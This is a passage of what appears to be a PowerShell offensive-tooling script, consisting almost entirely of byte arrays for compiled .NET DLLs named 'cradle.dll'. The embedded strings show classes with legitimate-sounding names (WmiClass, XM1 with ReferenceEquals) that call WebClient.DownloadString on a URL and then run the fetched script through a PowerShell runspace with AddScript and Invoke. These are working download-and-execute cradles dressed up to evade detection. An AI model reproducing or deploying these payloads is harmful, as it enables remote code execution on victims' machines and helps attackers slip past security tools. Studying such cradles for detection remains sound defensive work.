,0,250,37,51,0,22,0,0,1,0,0,0,9,0,0,0,2,0,0,0,2,0,0,0,1,0,0,0,11,0,0,0,2,0,0,0,1,0,0,0,1,0,0,0,3,0,0,0,0,0,10,0,1,0,0,0,0,0,6,0,46,0,39,0,6,0,102,0,70,0,6,0,134,0,70,0,10,0,239,0,200,0,10,0,255,0,200,0,10,0,28,1,171,0,14,0,63,1,52,1,6,0,129,1,98,1,10,0,142,1,171,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,1,0,16,0,21,0,0,0,5,0,1,0,1,0,80,32,0,0,0,0,150,0,53,0,10,0,1,0,146,32,0,0,0,0,134,24,60,0,15,0,2,0,0,0,1,0,66,0,17,0,60,0,19,0,25,0,60,0,15,0,33,0,8,1,33,0,41,0,23,1,15,0,49,0,53,0,38,0,49,0,39,1,43,0,57,0,60,0,15,0,57,0,73,1,49,0,49,0,88,1,54,0,49,0,151,1,60,0,9,0,60,0,15,0,46,0,11,0,76,0,46,0,19,0,85,0,69,0,4,128)+@(0)*16+@(164,0,0,0,4)+@(0)*11+@(1,0,30,0,0,0,0,0,3)+@(0)*11+@(24,0,171,0,0,0,0,0,4)+@(0)*11+@(1,0,39)+@(0)*8+@(0,0,60,77,111,100,117,108,101,62,0,99,114,97,100,108,101,46,100,108,108,0,87,109,105,67,49,97,115,115,0,109,115,99,111,114,108,105,98,0,83,121,115,116,101,109,0,79,98,106,101,99,116,0,67,114,101,97,116,101,0,46,99,116,111,114,0,117,114,108,0,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,67,111,109,112,105,108,101,114,83,101,114,118,105,99,101,115,0,67,111,109,112,105,108,97,116,105,111,110,82,101,108,97,120,97,116,105,111,110,115,65,116,116,114,105,98,117,116,101,0,82,117,110,116,105,109,101,67,111,109,112,97,116,105,98,105,108,105,116,121,65,116,116,114,105,98,117,116,101,0,99,114,97,100,108,101,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,82,117,110,115,112,97,99,101,115,0,82,117,110,115,112,97,99,101,70,97,99,116,111,114,121,0,82,117,110,115,112,97,99,101,0,67,114,101,97,116,101,82,117,110,115,112,97,99,101,0,79,112,101,110,0,80,111,119,101,114,83,104,101,108,108,0,115,101,116,95,82,117,110,115,112,97,99,101,0,83,121,115,116,101,109,46,78,101,116,0,87,101,98,67,108,105,101,110,116,0,68,111,119,110,108,111,97,100,83,116,114,105,110,103,0,65,100,100,83,99,114,105,112,116,0,83,121,115,116,101,109,46,67,111,108,108,101,99,116,105,111,110,115,46,79,98,106,101,99,116,77,111,100,101,108,0,67,111,108,108,101,99,116,105,111,110,96,49,0,80,83,79,98,106,101,99,116,0,73,110,118,111,107,101,0,0,0,0,3,32,0,0,0,0,0,209,67,36,5,160,65,219,73,167,109,222,249,154,92,173,143,0,8,183,122,92,86,25,52,224,137,4,0,1,1,14,3,32,0,1,4,32,1,1,8,8,49,191,56,86,173,54,78,53,4,0,0,18,21,4,0,0,18,25,5,32,1,1,18,21,4,32,1,14,14,5,32,1,18,25,14,8,32,0,21,18,33,1,18,37,6,7,2,18,21,18,25,8,1,0,8,0,0,0,0,0,30,1,0,1,0,84,2,22,87,114,97,112,78,111,110,69,120,99,101,112,116,105,111,110,84,104,114,111,119,115,1,192,36)+@(0)*8+@(0,0,222,36,0,0,0,32)+@(0)*22+@(208,36)+@(0)*16+@(95,67,111,114,68,108,108,77,97,105,110,0,109,115,99,111,114,101,101,46,100,108,108,0,0,0,0,0,255,37,0,32,0,16)+@(0)*282+@(1,0,16,0,0,0,24,0,0,128)+@(0)*14+@(1,0,1,0,0,0,48,0,0,128)+@(0)*14+@(1,0,0,0,0,0,72,0,0,0,88,64,0,0,68,2)+@(0)*8+@(0,0,68,2,52,0,0,0,86,0,83,0,95,0,86,0,69,0,82,0,83,0,73,0,79,0,78,0,95,0,73,0,78,0,70,0,79,0,0,0,0,0,189,4,239,254,0,0,1)+@(0)*16+@(0,63)+@(0)*7+@(4,0,0,0,2)+@(0)*14+@(0,68,0,0,0,1,0,86,0,97,0,114,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,0,0,36,0,4,0,0,0,84,0,114,0,97,0,110,0,115,0,108,0,97,0,116,0,105,0,111,0,110)+@(0)*7+@(176,4,164,1,0,0,1,0,83,0,116,0,114,0,105,0,110,0,103,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,128,1,0,0,1,0,48,0,48,0,48,0,48,0,48,0,52,0,98,0,48,0,0,0,44,0,2,0,1,0,70,0,105,0,108,0,101,0,68,0,101,0,115,0,99,0,114,0,105,0,112,0,116,0,105,0,111,0,110,0,0,0,0,0,32,0,0,0,48,0,8,0,1,0,70,0,105,0,108,0,101,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,11,0,1,0,73,0,110,0,116,0,101,0,114,0,110,0,97,0,108,0,78,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,40,0,2,0,1,0,76,0,101,0,103,0,97,0,108,0,67,0,111,0,112,0,121,0,114,0,105,0,103,0,104,0,116,0,0,0,32,0,0,0,64,0,11,0,1,0,79,0,114,0,105,0,103,0,105,0,110,0,97,0,108,0,70,0,105,0,108,0,101,0,110,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,52,0,8,0,1,0,80,0,114,0,111,0,100,0,117,0,99,0,116,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,8,0,1,0,65,0,115,0,115,0,101,0,109,0,98,0,108,0,121,0,32,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48)+@(0)*360+@(32,0,0,12,0,0,0,240,52)+@(0)*502","$CompiledHeader`192,48,17,89)+@(0)*8+@(224,0,2,33,11,1,11,0,0,6,0,0,0,6,0,0,0,0,0,0,46,37,0,0,0,32,0,0,0,64,0,0,0,0,0,16,0,32,0,0,0,2,0,0,4)+@(0)*7+@(4)+@(0)*8+@(128,0,0,0,2,0,0,0,0,0,0,3,0,64,133,0,0,16,0,0,16,0,0,0,0,16,0,0,16,0,0,0,0,0,0,16)+@(0)*11+@(220,36,0,0,79,0,0,0,0,64,0,0,160,2)+@(0)*19+@(96,0,0,12)+@(0)*52+@(32,0,0,8)+@(0)*11+@(8,32,0,0,72)+@(0)*11+@(46,116,101,120,116,0,0,0,52,5,0,0,0,32,0,0,0,6,0,0,0,2)+@(0)*14+@(32,0,0,96,46,114,115,114,99,0,0,0,160,2,0,0,0,64,0,0,0,4,0,0,0,8)+@(0)*14+@(64,0,0,64,46,114,101,108,111,99,0,0,12,0,0,0,0,96,0,0,0,2,0,0,0,12)+@(0)*14+@(64,0,0,66)+@(0)*16+@(16,37,0,0,0,0,0,0,72,0,0,0,2,0,5,0,168,32,0,0,52,4,0,0,1)+@(0)*55+@(19,48,4,0,65,0,0,0,1,0,0,17,0,40,3,0,0,10,10,6,111,4,0,0,10,0,40,5,0,0,10,11,7,6,111,6,0,0,10,0,7,115,7,0,0,10,2,40,8,0,0,10,114,1,0,0,112,3,40,9,0,0,10,111,10,0,0,10,38,7,111,11,0,0,10,38,42,30,2,40,12,0,0,10,42,0,0,0,66,83,74,66,1,0,1,0,0,0,0,0,12,0,0,0,118,52,46,48,46,51,48,51,49,57,0,0,0,0,5,0,108,0,0,0,116,1,0,0,35,126,0,0,224,1,0,0,192,1,0,0,35,83,116,114,105,110,103,115,0,0,0,0,160,3,0,0,8,0,0,0,35,85,83,0,168,3,0,0,16,0,0,0,35,71,85,73,68,0,0,0,184,3,0,0,124,0,0,0,35,66,108,111,98)+@(0)*7+@(2,0,0,1,71,21,2,0,9,0,0,0,0,250,37,51,0,22,0,0,1,0,0,0,10,0,0,0,2,0,0,0,2,0,0,0,2,0,0,0,12,0,0,0,2,0,0,0,1,0,0,0,1,0,0,0,3,0,0,0,0,0,10,0,1,0,0,0,0,0,6,0,46,0,39,0,6,0,120,0,88,0,6,0,152,0,88,0,10,0,1,1,218,0,10,0,17,1,218,0,10,0,46,1,189,0,14,0,81,1,70,1,6,0,106,1,39,0,6,0,161,1,130,1,10,0,174,1,189,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,1,0,16,0,21,0,0,0,5,0,1,0,1,0,80,32,0,0,0,0,150,0,53,0,10,0,1,0,157,32,0,0,0,0,134,24,60,0,16,0,3,0,0,0,1,0,66,0,0,0,2,0,70,0,17,0,60,0,20,0,25,0,60,0,16,0,33,0,26,1,34,0,41,0,41,1,16,0,49,0,53,0,39,0,49,0,57,1,44,0,57,0,60,0,16,0,57,0,91,1,50,0,65,0,113,1,55,0,49,0,120,1,62,0,49,0,183,1,68,0,9,0,60,0,16,0,46,0,11,0,84,0,46,0,19,0,93,0,77,0,4,128)+@(0)*16+@(182,0,0,0,4)+@(0)*11+@(1,0,30,0,0,0,0,0,3)+@(0)*11+@(25,0,189,0,0,0,0,0,4)+@(0)*11+@(1,0,39)+@(0)*8+@(60,77,111,100,117,108,101,62,0,99,114,97,100,108,101,46,100,108,108,0,87,109,105,67,49,97,115,115,0,109,115,99,111,114,108,105,98,0,83,121,115,116,101,109,0,79,98,106,101,99,116,0,67,114,101,97,116,101,0,46,99,116,111,114,0,117,114,108,0,112,111,115,116,99,114,97,100,108,101,99,111,109,109,97,110,100,0,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,67,111,109,112,105,108,101,114,83,101,114,118,105,99,101,115,0,67,111,109,112,105,108,97,116,105,111,110,82,101,108,97,120,97,116,105,111,110,115,65,116,116,114,105,98,117,116,101,0,82,117,110,116,105,109,101,67,111,109,112,97,116,105,98,105,108,105,116,121,65,116,116,114,105,98,117,116,101,0,99,114,97,100,108,101,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,82,117,110,115,112,97,99,101,115,0,82,117,110,115,112,97,99,101,70,97,99,116,111,114,121,0,82,117,110,115,112,97,99,101,0,67,114,101,97,116,101,82,117,110,115,112,97,99,101,0,79,112,101,110,0,80,111,119,101,114,83,104,101,108,108,0,115,101,116,95,82,117,110,115,112,97,99,101,0,83,121,115,116,101,109,46,78,101,116,0,87,101,98,67,108,105,101,110,116,0,68,111,119,110,108,111,97,100,83,116,114,105,110,103,0,83,116,114,105,110,103,0,67,111,110,99,97,116,0,65,100,100,83,99,114,105,112,116,0,83,121,115,116,101,109,46,67,111,108,108,101,99,116,105,111,110,115,46,79,98,106,101,99,116,77,111,100,101,108,0,67,111,108,108,101,99,116,105,111,110,96,49,0,80,83,79,98,106,101,99,116,0,73,110,118,111,107,101,0,0,0,0,3,59,0,0,0,0,0,27,68,49,96,198,220,32,78,145,159,141,18,32,155,233,6,0,8,183,122,92,86,25,52,224,137,5,0,2,1,14,14,3,32,0,1,4,32,1,1,8,8,49,191,56,86,173,54,78,53,4,0,0,18,21,4,0,0,18,25,5,32,1,1,18,21,4,32,1,14,14,6,0,3,14,14,14,14,5,32,1,18,25,14,8,32,0,21,18,37,1,18,41,6,7,2,18,21,18,25,8,1,0,8,0,0,0,0,0,30,1,0,1,0,84,2,22,87,114,97,112,78,111,110,69,120,99,101,112,116,105,111,110,84,104,114,111,119,115,1,4,37)+@(0)*8+@(0,0,30,37,0,0,0,32)+@(0)*22+@(16,37)+@(0)*12+@(95,67,111,114,68,108,108,77,97,105,110,0,109,115,99,111,114,101,101,46,100,108,108,0,0,0,0,0,255,37,0,32,0,16)+@(0)*218+@(1,0,16,0,0,0,24,0,0,128)+@(0)*14+@(1,0,1,0,0,0,48,0,0,128)+@(0)*14+@(1,0,0,0,0,0,72,0,0,0,88,64,0,0,68,2)+@(0)*8+@(0,0,68,2,52,0,0,0,86,0,83,0,95,0,86,0,69,0,82,0,83,0,73,0,79,0,78,0,95,0,73,0,78,0,70,0,79,0,0,0,0,0,189,4,239,254,0,0,1)+@(0)*16+@(0,63)+@(0)*7+@(4,0,0,0,2)+@(0)*14+@(0,68,0,0,0,1,0,86,0,97,0,114,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,0,0,36,0,4,0,0,0,84,0,114,0,97,0,110,0,115,0,108,0,97,0,116,0,105,0,111,0,110)+@(0)*7+@(176,4,164,1,0,0,1,0,83,0,116,0,114,0,105,0,110,0,103,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,128,1,0,0,1,0,48,0,48,0,48,0,48,0,48,0,52,0,98,0,48,0,0,0,44,0,2,0,1,0,70,0,105,0,108,0,101,0,68,0,101,0,115,0,99,0,114,0,105,0,112,0,116,0,105,0,111,0,110,0,0,0,0,0,32,0,0,0,48,0,8,0,1,0,70,0,105,0,108,0,101,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,11,0,1,0,73,0,110,0,116,0,101,0,114,0,110,0,97,0,108,0,78,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,40,0,2,0,1,0,76,0,101,0,103,0,97,0,108,0,67,0,111,0,112,0,121,0,114,0,105,0,103,0,104,0,116,0,0,0,32,0,0,0,64,0,11,0,1,0,79,0,114,0,105,0,103,0,105,0,110,0,97,0,108,0,70,0,105,0,108,0,101,0,110,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,52,0,8,0,1,0,80,0,114,0,111,0,100,0,117,0,99,0,116,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,8,0,1,0,65,0,115,0,115,0,101,0,109,0,98,0,108,0,121,0,32,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48)+@(0)*360+@(32,0,0,12,0,0,0,48,53)+@(0)*502"))
    $LegitSoundingClassAndMethodCompiledNormal  += , @('XM1'           , 'ReferenceEquals'   , @("$CompiledHeader`224,48,17,89)+@(0)*8+@(224,0,2,33,11,1,8,0,0,4,0,0,0,6,0,0,0,0,0,0,126,35,0,0,0,32,0,0,0,64,0,0,0,0,64,0,0,32,0,0,0,2,0,0,4)+@(0)*7+@(4)+@(0)*8+@(128,0,0,0,2,0,0,0,0,0,0,3,0,64,133,0,0,16,0,0,16,0,0,0,0,16,0,0,16,0,0,0,0,0,0,16)+@(0)*11+@(40,35,0,0,83,0,0,0,0,64,0,0,160,2)+@(0)*19+@(96,0,0,12)+@(0)*52+@(32,0,0,8)+@(0)*11+@(8,32,0,0,72)+@(0)*11+@(46,116,101,120,116,0,0,0,132,3,0,0,0,32,0,0,0,4,0,0,0,2)+@(0)*14+@(32,0,0,96,46,114,115,114,99,0,0,0,160,2,0,0,0,64,0,0,0,4,0,0,0,6)+@(0)*14+@(64,0,0,64,46,114,101,108,111,99,0,0,12,0,0,0,0,96,0,0,0,2,0,0,0,10)+@(0)*14+@(64,0,0,66)+@(0)*16+@(96,35,0,0,0,0,0,0,72,0,0,0,2,0,5,0,120,32,0,0,176,2,0,0,1)+@(0)*55+@(19,48,2,0,17,0,0,0,1,0,0,17,0,115,3,0,0,10,2,40,4,0,0,10,10,43,0,6,42,30,2,40,5,0,0,10,42,0,0,0,66,83,74,66,1,0,1,0,0,0,0,0,12,0,0,0,118,50,46,48,46,53,48,55,50,55,0,0,0,0,5,0,108,0,0,0,12,1,0,0,35,126,0,0,120,1,0,0,212,0,0,0,35,83,116,114,105,110,103,115,0,0,0,0,76,2,0,0,8,0,0,0,35,85,83,0,84,2,0,0,16,0,0,0,35,71,85,73,68,0,0,0,100,2,0,0,76,0,0,0,35,66,108,111,98)+@(0)*7+@(2,0,0,1,71,21,2,0,9,0,0,0,0,250,1,51,0,22,0,0,1,0,0,0,4,0,0,0,2,0,0,0,2,0,0,0,1,0,0,0,5,0,0,0,2,0,0,0,1,0,0,0,1,0,0,0,2,0,0,0,0,0,10,0,1,0,0,0,0,0,6,0,41,0,34,0,6,0,102,0,70,0,6,0,134,0,70,0,10,0,186,0,175,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,1,0,16,0,21,0,0,0,5,0,1,0,1,0,80,32,0,0,0,0,150,0,48,0,10,0,1,0,109,32,0,0,0,0,134,24,64,0,15,0,2,0,0,0,1,0,171,0,17,0,64,0,19,0,25,0,64,0,15,0,33,0,64,0,15,0,33,0,196,0,24,0,9,0,64,0,15,0,46,0,11,0,33,0,46,0,19,0,42,0,29,0,4,128)+@(0)*16+@(164,0,0,0,2)+@(0)*11+@(1,0,25,0,0,0,0,0,2)+@(0)*11+@(1,0,34)+@(0)*8+@(60,77,111,100,117,108,101,62,0,99,114,97,100,108,101,46,100,108,108,0,88,77,49,0,109,115,99,111,114,108,105,98,0,83,121,115,116,101,109,0,79,98,106,101,99,116,0,82,101,102,101,114,101,110,99,101,69,113,117,97,108,115,0,46,99,116,111,114,0,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,67,111,109,112,105,108,101,114,83,101,114,118,105,99,101,115,0,67,111,109,112,105,108,97,116,105,111,110,82,101,108,97,120,97,116,105,111,110,115,65,116,116,114,105,98,117,116,101,0,82,117,110,116,105,109,101,67,111,109,112,97,116,105,98,105,108,105,116,121,65,116,116,114,105,98,117,116,101,0,99,114,97,100,108,101,0,117,114,108,0,83,121,115,116,101,109,46,78,101,116,0,87,101,98,67,108,105,101,110,116,0,68,111,119,110,108,111,97,100,83,116,114,105,110,103,0,0,0,3,32,0,0,0,0,0,123,1,21,224,35,247,48,66,143,184,207,223,71,116,250,93,0,8,183,122,92,86,25,52,224,137,4,0,1,14,14,3,32,0,1,4,32,1,1,8,4,32,1,14,14,3,7,1,14,8,1,0,8,0,0,0,0,0,30,1,0,1,0,84,2,22,87,114,97,112,78,111,110,69,120,99,101,112,116,105,111,110,84,104,114,111,119,115,1,0,0,0,80,35)+@(0)*8+@(0,0,110,35,0,0,0,32)+@(0)*22+@(96,35)+@(0)*16+@(95,67,111,114,68,108,108,77,97,105,110,0,109,115,99,111,114,101,101,46,100,108,108,0,0,0,0,0,255,37,0,32,64)+@(0)*139+@(1,0,16,0,0,0,24,0,0,128)+@(0)*14+@(1,0,1,0,0,0,48,0,0,128)+@(0)*14+@(1,0,0,0,0,0,72,0,0,0,88,64,0,0,68,2)+@(0)*8+@(0,0,68,2,52,0,0,0,86,0,83,0,95,0,86,0,69,0,82,0,83,0,73,0,79,0,78,0,95,0,73,0,78,0,70,0,79,0,0,0,0,0,189,4,239,254,0,0,1)+@(0)*16+@(0,63)+@(0)*7+@(4,0,0,0,2)+@(0)*14+@(0,68,0,0,0,1,0,86,0,97,0,114,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,0,0,36,0,4,0,0,0,84,0,114,0,97,0,110,0,115,0,108,0,97,0,116,0,105,0,111,0,110)+@(0)*7+@(176,4,164,1,0,0,1,0,83,0,116,0,114,0,105,0,110,0,103,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,128,1,0,0,1,0,48,0,48,0,48,0,48,0,48,0,52,0,98,0,48,0,0,0,44,0,2,0,1,0,70,0,105,0,108,0,101,0,68,0,101,0,115,0,99,0,114,0,105,0,112,0,116,0,105,0,111,0,110,0,0,0,0,0,32,0,0,0,48,0,8,0,1,0,70,0,105,0,108,0,101,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,11,0,1,0,73,0,110,0,116,0,101,0,114,0,110,0,97,0,108,0,78,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,40,0,2,0,1,0,76,0,101,0,103,0,97,0,108,0,67,0,111,0,112,0,121,0,114,0,105,0,103,0,104,0,116,0,0,0,32,0,0,0,64,0,11,0,1,0,79,0,114,0,105,0,103,0,105,0,110,0,97,0,108,0,70,0,105,0,108,0,101,0,110,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,52,0,8,0,1,0,80,0,114,0,111,0,100,0,117,0,99,0,116,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,8,0,1,0,65,0,115,0,115,0,101,0,109,0,98,0,108,0,121,0,32,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48)+@(0)*360+@(32,0,0,12,0,0,0,128,51)+@(0)*502","$CompiledHeader`252,48,17,89)+@(0)*8+@(224,0,2,33,11,1,11,0,0,6,0,0,0,6,0,0,0,0,0,0,254,36,0,0,0,32,0,0,0,64,0,0,0,0,0,16,0,32,0,0,0,2,0,0,4)+@(0)*7+@(4)+@(0)*8+@(128,0,0,0,2,0,0,0,0,0,0,3,0,64,133,0,0,16,0,0,16,0,0,0,0,16,0,0,16,0,0,0,0,0,0,16)+@(0)*11+@(164,36,0,0,87,0,0,0,0,64,0,0,160,2)+@(0)*19+@(96,0,0,12)+@(0)*52+@(32,0,0,8)+@(0)*11+@(8,32,0,0,72)+@(0)*11+@(46,116,101,120,116,0,0,0,4,5,0,0,0,32,0,0,0,6,0,0,0,2)+@(0)*14+@(32,0,0,96,46,114,115,114,99,0,0,0,160,2,0,0,0,64,0,0,0,4,0,0,0,8)+@(0)*14+@(64,0,0,64,46,114,101,108,111,99,0,0,12,0,0,0,0,96,0,0,0,2,0,0,0,12)+@(0)*14+@(64,0,0,66)+@(0)*16+@(224,36,0,0,0,0,0,0,72,0,0,0,2,0,5,0,156,32,0,0,8,4,0,0,1)+@(0)*55+@(19,48,3,0,54,0,0,0,1,0,0,17,0,40,3,0,0,10,10,6,111,4,0,0,10,0,40,5,0,0,10,11,7,6,111,6,0,0,10,0,7,115,7,0,0,10,2,40,8,0,0,10,111,9,0,0,10,38,7,111,10,0,0,10,38,42,30,2,40,11,0,0,10,42,0,0,66,83,74,66,1,0,1,0,0,0,0,0,12,0,0,0,118,52,46,48,46,51,48,51,49,57,0,0,0,0,5,0,108,0,0,0,100,1,0,0,35,126,0,0,208,1,0,0,172,1,0,0,35,83,116,114,105,110,103,115,0,0,0,0,124,3,0,0,8,0,0,0,35,85,83,0,132,3,0,0,16,0,0,0,35,71,85,73,68,0,0,0,148,3,0,0,116,0,0,0,35,66,108,111,98)+@(0)*7+@(2,0,0,1,71,21,2,0,9,0,0,0,0,250,37,51,0,22,0,0,1,0,0,0,9,0,0,0,2,0,0,0,2,0,0,0,1,0,0,0,11,0,0,0,2,0,0,0,1,0,0,0,1,0,0,0,3,0,0,0,0,0,10,0,1,0,0,0,0,0,6,0,41,0,34,0,6,0,106,0,74,0,6,0,138,0,74,0,10,0,243,0,204,0,10,0,3,1,204,0,10,0,32,1,175,0,14,0,74,1,63,1,6,0,140,1,109,1,10,0,153,1,175,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,1,0,16,0,21,0,0,0,5,0,1,0,1,0,80,32,0,0,0,0,150,0,48,0,10,0,1,0,146,32,0,0,0,0,134,24,64,0,15,0,2,0,0,0,1,0,70,0,17,0,64,0,19,0,25,0,64,0,15,0,33,0,12,1,33,0,41,0,27,1,15,0,49,0,43,1,38,0,49,0,50,1,43,0,57,0,64,0,15,0,57,0,84,1,49,0,49,0,99,1,54,0,49,0,162,1,60,0,9,0,64,0,15,0,46,0,11,0,76,0,46,0,19,0,85,0,69,0,4,128)+@(0)*16+@(168,0,0,0,4)+@(0)*11+@(1,0,25,0,0,0,0,0,3)+@(0)*11+@(24,0,175,0,0,0,0,0,4)+@(0)*11+@(1,0,34)+@(0)*8+@(0,0,60,77,111,100,117,108,101,62,0,99,114,97,100,108,101,46,100,108,108,0,88,77,49,0,109,115,99,111,114,108,105,98,0,83,121,115,116,101,109,0,79,98,106,101,99,116,0,82,101,102,101,114,101,110,99,101,69,113,117,97,108,115,0,46,99,116,111,114,0,117,114,108,0,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,67,111,109,112,105,108,101,114,83,101,114,118,105,99,101,115,0,67,111,109,112,105,108,97,116,105,111,110,82,101,108,97,120,97,116,105,111,110,115,65,116,116,114,105,98,117,116,101,0,82,117,110,116,105,109,101,67,111,109,112,97,116,105,98,105,108,105,116,121,65,116,116,114,105,98,117,116,101,0,99,114,97,100,108,101,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,82,117,110,115,112,97,99,101,115,0,82,117,110,115,112,97,99,101,70,97,99,116,111,114,121,0,82,117,110,115,112,97,99,101,0,67,114,101,97,116,101,82,117,110,115,112,97,99,101,0,79,112,101,110,0,80,111,119,101,114,83,104,101,108,108,0,67,114,101,97,116,101,0,115,101,116,95,82,117,110,115,112,97,99,101,0,83,121,115,116,101,109,46,78,101,116,0,87,101,98,67,108,105,101,110,116,0,68,111,119,110,108,111,97,100,83,116,114,105,110,103,0,65,100,100,83,99,114,105,112,116,0,83,121,115,116,101,109,46,67,111,108,108,101,99,116,105,111,110,115,46,79,98,106,101,99,116,77,111,100,101,108,0,67,111,108,108,101,99,116,105,111,110,96,49,0,80,83,79,98,106,101,99,116,0,73,110,118,111,107,101,0,0,0,0,0,3,32,0,0,0,0,0,20,213,205,88,217,88,18,69,146,161,58,100,196,39,131,192,0,8,183,122,92,86,25,52,224,137,4,0,1,1,14,3,32,0,1,4,32,1,1,8,8,49,191,56,86,173,54,78,53,4,0,0,18,21,4,0,0,18,25,5,32,1,1,18,21,4,32,1,14,14,5,32,1,18,25,14,8,32,0,21,18,33,1,18,37,6,7,2,18,21,18,25,8,1,0,8,0,0,0,0,0,30,1,0,1,0,84,2,22,87,114,97,112,78,111,110,69,120,99,101,112,116,105,111,110,84,104,114,111,119,115,1,204,36)+@(0)*8+@(0,0,238,36,0,0,0,32)+@(0)*22+@(224,36)+@(0)*20+@(95,67,111,114,68,108,108,77,97,105,110,0,109,115,99,111,114,101,101,46,100,108,108,0,0,0,0,0,255,37,0,32,0,16)+@(0)*266+@(1,0,16,0,0,0,24,0,0,128)+@(0)*14+@(1,0,1,0,0,0,48,0,0,128)+@(0)*14+@(1,0,0,0,0,0,72,0,0,0,88,64,0,0,68,2)+@(0)*8+@(0,0,68,2,52,0,0,0,86,0,83,0,95,0,86,0,69,0,82,0,83,0,73,0,79,0,78,0,95,0,73,0,78,0,70,0,79,0,0,0,0,0,189,4,239,254,0,0,1)+@(0)*16+@(0,63)+@(0)*7+@(4,0,0,0,2)+@(0)*14+@(0,68,0,0,0,1,0,86,0,97,0,114,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,0,0,36,0,4,0,0,0,84,0,114,0,97,0,110,0,115,0,108,0,97,0,116,0,105,0,111,0,110)+@(0)*7+@(176,4,164,1,0,0,1,0,83,0,116,0,114,0,105,0,110,0,103,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,128,1,0,0,1,0,48,0,48,0,48,0,48,0,48,0,52,0,98,0,48,0,0,0,44,0,2,0,1,0,70,0,105,0,108,0,101,0,68,0,101,0,115,0,99,0,114,0,105,0,112,0,116,0,105,0,111,0,110,0,0,0,0,0,32,0,0,0,48,0,8,0,1,0,70,0,105,0,108,0,101,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,11,0,1,0,73,0,110,0,116,0,101,0,114,0,110,0,97,0,108,0,78,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,40,0,2,0,1,0,76,0,101,0,103,0,97,0,108,0,67,0,111,0,112,0,121,0,114,0,105,0,103,0,104,0,116,0,0,0,32,0,0,0,64,0,11,0,1,0,79,0,114,0,105,0,103,0,105,0,110,0,97,0,108,0,70,0,105,0,108,0,101,0,110,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,52,0,8,0,1,0,80,0,114,0,111,0,100,0,117,0,99,0,116,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,8,0,1,0,65,0,115,0,115,0,101,0,109,0,98,0,108,0,121,0,32,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48)+@(0)*360+@(32,0,0,12,0,0,0,0,53)+@(0)*502","$CompiledHeader`15,49,17,89)+@(0)*8+@(224,0,2,33,11,1,11,0,0,6,0,0,0,6,0,0,0,0,0,0,62,37,0,0,0,32,0,0,0,64,0,0,0,0,0,16,0,32,0,0,0,2,0,0,4)+@(0)*7+@(4)+@(0)*8+@(128,0,0,0,2,0,0,0,0,0,0,3,0,64,133,0,0,16,0,0,16,